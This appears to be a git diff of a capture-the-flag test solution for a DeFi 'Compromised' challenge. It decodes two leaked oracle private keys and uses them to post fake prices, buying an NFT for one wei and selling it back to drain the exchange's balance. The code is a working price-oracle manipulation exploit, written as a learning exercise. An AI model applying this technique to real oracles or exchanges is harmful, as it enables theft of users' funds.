@@ -53,28 +53,56 @@ describe('Compromised challenge', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        hacker = await (await ethers.getContractFactory('HackCompromised', deployer)).deploy(
-            exchange.address,
-            oracle.address,
-            nftToken.address
-        );
-/*
-        expect(
-            await oracle.getMedianPrice(nftToken.symbol())
-        ).to.be.eq(EXCHANGE_INITIAL_ETH_BALANCE);
-*/
-        await hacker.connect(player).hack()
+        
+        // Into the server's response are two encoded private keys from two of the three oracles.
+        const leakedPrivateKeys = [
+            '4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35',
+            '4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34',
+        ];
 
-        await nftToken.connect(exchange).safeMint(exchange.address);
-        expect(
-            await nftToken.balanceOf(exchange.address)
-        ).to.be.eq(1);
+        // We need to decode this private keys
+        // The private keys are encoded in base64
+        // We need to format the string in order to get the base64 and then decode it
+        const rawToPrivateKey = (raw) => {
+            const base64 = Buffer.from(raw.split(` `).join(``), `hex`).toString(`utf8`);
+            const key = Buffer.from(base64, `base64`).toString(`utf8`);
+            return key;
+        }
+        
+        // We decode the two private keys
+        const privateKey1 = rawToPrivateKey(leakedPrivateKeys[0]);
+        const privateKey2 = rawToPrivateKey(leakedPrivateKeys[1]);
 
-        /*
-        expect(
-            await ethers.provider.getBalance(player.address)
-        ).to.be.eq(PLAYER_INITIAL_ETH_BALANCE);
-        */
+        // And then, we initialize the wallets using ethers.js
+        const trustedOracle1 = new ethers.Wallet(privateKey1, ethers.provider);
+        const trustedOracle2 = new ethers.Wallet(privateKey2, ethers.provider);
+        
+        // We get the token's symbol
+        const tokenSymbol = await nftToken.symbol();
+
+        // Console log the price before we start
+        console.log('Price before:', String(await oracle.getMedianPrice(tokenSymbol)));
+
+        // Change the price of the token to zero
+        await oracle.connect(trustedOracle1).postPrice(tokenSymbol, 0);
+        await oracle.connect(trustedOracle2).postPrice(tokenSymbol, 0);
+        // Check we had changed the price to zero
+        console.log('Price when buying:', String(await oracle.getMedianPrice(tokenSymbol)));
+        
+        // Buy one token with one wei
+        await exchange.connect(player).buyOne({value: 1});
+
+        // Change back the price of the NFT to the exchange eth balance
+        await oracle.connect(trustedOracle1).postPrice(tokenSymbol, EXCHANGE_INITIAL_ETH_BALANCE)
+        await oracle.connect(trustedOracle2).postPrice(tokenSymbol, EXCHANGE_INITIAL_ETH_BALANCE)
+        // Check we had changed the price to the exchange balance
+        console.log('Price when selling:', String(await oracle.getMedianPrice(tokenSymbol)));
+
+        // Approve the exchange to sell our nft
+        await nftToken.connect(player).approve(exchange.address, 0);
+        // Sell the nft and empty the exchange balance
+        await exchange.connect(player).sellOne(0);
+
     });
 
     after(async function () {
